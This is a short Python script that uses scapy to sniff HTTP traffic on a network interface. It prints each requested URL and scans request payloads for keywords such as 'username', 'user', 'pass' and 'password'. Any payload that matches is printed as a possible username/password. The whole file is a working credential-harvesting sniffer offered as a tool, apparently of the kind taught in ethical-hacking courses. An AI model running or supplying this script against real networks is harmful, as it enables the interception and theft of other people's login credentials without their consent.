#!/usr/bin/python
import optparse
import scapy.all as scapy
from scapy.layers import http

def get_arguments():
    parser=optparse.OptionParser()
    parser.add_option("-i","--interface",dest="interface",help="Provide interface name to capture packets")
    (options, arguments) = parser.parse_args()
    if not (options.interface):
        parser.error("Enter interface name to continue. Use --help for more info")
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packets)

def sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):

        if packet.haslayer(http.HTTPRequest):
            host = (packet[http.HTTPRequest].Host.decode())
            path = (packet[http.HTTPRequest].Path.decode())
            print("[+] HTTP request URL>> " + host+path)

        if packet.haslayer(scapy.Raw):
            load = (packet[scapy.Raw].load.decode())
            keywords = ["username", "uname", "user", "password", "pass", "login"]
            for keyword in keywords:
                if keyword in load:
                    print("--------------------------------------------------------------------------------------------------------------")
                    print("Possible Username/Password>> " + load)
                    print("--------------------------------------------------------------------------------------------------------------")
                    break

options = get_arguments()
sniff(options.interface)
